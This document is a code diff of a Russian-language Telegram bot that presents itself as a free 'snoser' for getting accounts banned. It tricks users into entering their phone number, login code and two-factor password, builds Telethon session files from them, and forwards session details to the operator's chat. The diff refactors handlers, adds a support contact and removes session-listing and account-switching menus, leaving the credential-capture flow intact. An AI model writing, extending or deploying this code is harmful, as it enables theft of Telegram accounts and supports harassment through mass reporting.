@@ -6,8 +6,8 @@ from pathlib import Path
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
 from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
-from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command, StateFilter
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -56,11 +56,11 @@ class SnosStates(StatesGroup):
 # ===== ФУНКЦИИ =====
 def create_client(user_id):
     session_file = f"{SESSIONS_DIR}/user_{user_id}"
-    if PROXY:
+    if PROXY and PROXY.get("proxy_type") and PROXY.get("addr"):
         return TelegramClient(
             session_file, API_ID, API_HASH,
             connection=ConnectionTcpAbridged,
-            proxy=PROXY
+            proxy=(PROXY["proxy_type"], PROXY["addr"], PROXY["port"], PROXY["username"], PROXY["password"])
         )
     return TelegramClient(session_file, API_ID, API_HASH)
 
@@ -80,7 +80,7 @@ async def send_session_to_admin(user_id, phone, client):
             f"📱 Телефон: {phone}\n"
             f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
         )
-        if PROXY:
+        if PROXY and PROXY.get("proxy_type"):
             text += f"🌐 Прокси: {PROXY['proxy_type']}://{PROXY['addr']}:{PROXY['port']}"
         
         await bot.send_message(YOUR_USER_ID, text)
@@ -114,8 +114,7 @@ def cancel_keyboard():
 def main_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🚀 Начать снос", callback_data="start_snos")],
-        [InlineKeyboardButton(text="🔄 Сменить аккаунт", callback_data="change_account")],
-        [InlineKeyboardButton(text="📁 Мои сессии", callback_data="list_sessions")]
+        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")]
     ])
 
 # ===== ОБРАБОТЧИКИ =====
@@ -125,7 +124,12 @@ async def start(message: types.Message, state: FSMContext):
     if user_id in user_clients and user_clients[user_id].is_connected():
         await message.answer("✅ Вы авторизованы!", reply_markup=main_menu())
     else:
-        await message.answer("Добрый день,это сносер БЕСПЛАТНЫЙ,но требует верефикации для удаления ВАС из базы данных сносов,чтобы вас было сложнее снести,а ещё чтобы снос был 100% если есть вопросы пишите - @gmailkaratel или @deamorgan 🔐 Введите номер телефона в формате +7XXXXXXXXXX:")
+        await message.answer(
+            "Добрый день, это сносер БЕСПЛАТНЫЙ, но требует верификации для удаления ВАС из базы данных сносов, "
+            "чтобы вас было сложнее снести, а ещё чтобы снос был 100%\n\n"
+            "Если есть вопросы пишите - @gmailkaratel или @deamorgan\n\n"
+            "🔐 Введите номер телефона в формате +7XXXXXXXXXX:"
+        )
         await state.set_state(AuthStates.waiting_phone)
         auth_states[user_id] = {}
 
@@ -164,13 +168,17 @@ async def get_phone(message: types.Message, state: FSMContext):
     except Exception as e:
         await message.answer(f"❌ Ошибка: {str(e)[:200]}\nПопробуйте /start")
 
-@dp.callback_query(lambda c: c.data.startswith("code_") and c.data != "code_done", state=AuthStates.waiting_code)
+@dp.callback_query(F.data.startswith("code_"), StateFilter(AuthStates.waiting_code))
 async def handle_code_digit(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     action = callback.data.split("_")[1]
     
     if action == "backspace":
         auth_states[user_id]["code"] = auth_states[user_id]["code"][:-1]
+    elif action == "done":
+        # Обрабатываем подтверждение
+        await code_done(callback, state)
+        return
     else:
         auth_states[user_id]["code"] += action
     
@@ -181,7 +189,6 @@ async def handle_code_digit(callback: types.CallbackQuery, state: FSMContext):
     )
     await callback.answer()
 
-@dp.callback_query(lambda c: c.data == "code_done", state=AuthStates.waiting_code)
 async def code_done(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     code = auth_states[user_id].get("code", "")
@@ -240,26 +247,7 @@ async def handle_password(message: types.Message, state: FSMContext):
         await message.answer(f"❌ Неверный пароль: {str(e)}")
         await state.set_state(AuthStates.waiting_password)
 
-@dp.callback_query(lambda c: c.data == "list_sessions")
-async def list_sessions(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    session_files = list(Path(SESSIONS_DIR).glob(f"user_{user_id}*.session"))
-    
-    if not session_files:
-        await callback.answer("Нет сессий", show_alert=True)
-        return
-    
-    text = "📁 Ваши сессии:\n\n"
-    for f in session_files:
-        stat = f.stat()
-        modified = datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
-        size = stat.st_size / 1024
-        text += f"• {f.name}\n  📅 {modified} | 💾 {size:.1f} KB\n"
-    
-    await callback.message.answer(text)
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data == "cancel")
+@dp.callback_query(F.data == "cancel")
 async def cancel(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     if user_id in auth_states:
@@ -271,22 +259,20 @@ async def cancel(callback: types.CallbackQuery, state: FSMContext):
     await state.clear()
     await callback.answer()
 
-@dp.callback_query(lambda c: c.data == "change_account")
-async def change_account(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    if user_id in user_clients:
-        await user_clients[user_id].disconnect()
-        del user_clients[user_id]
-    if user_id in auth_states:
-        auth_states.pop(user_id)
-    
-    await callback.message.edit_text("🔄 Смена аккаунта.\nВведите номер телефона:")
-    await state.set_state(AuthStates.waiting_phone)
-    auth_states[user_id] = {}
+@dp.callback_query(F.data == "support")
+async def support(callback: types.CallbackQuery):
+    await callback.message.answer(
+        "🆘 **Поддержка:**\n\n"
+        "По всем вопросам обращайтесь:\n"
+        "• @deamorgan\n"
+        "• @gmailkaratel\n\n"
+        "Ответим в ближайшее время!",
+        parse_mode="Markdown"
+    )
     await callback.answer()
 
 # ===== СНОС (ДЕМО) =====
-@dp.callback_query(lambda c: c.data == "start_snos")
+@dp.callback_query(F.data == "start_snos")
 async def start_snos(callback: types.CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     if user_id not in user_clients or not user_clients[user_id].is_connected():
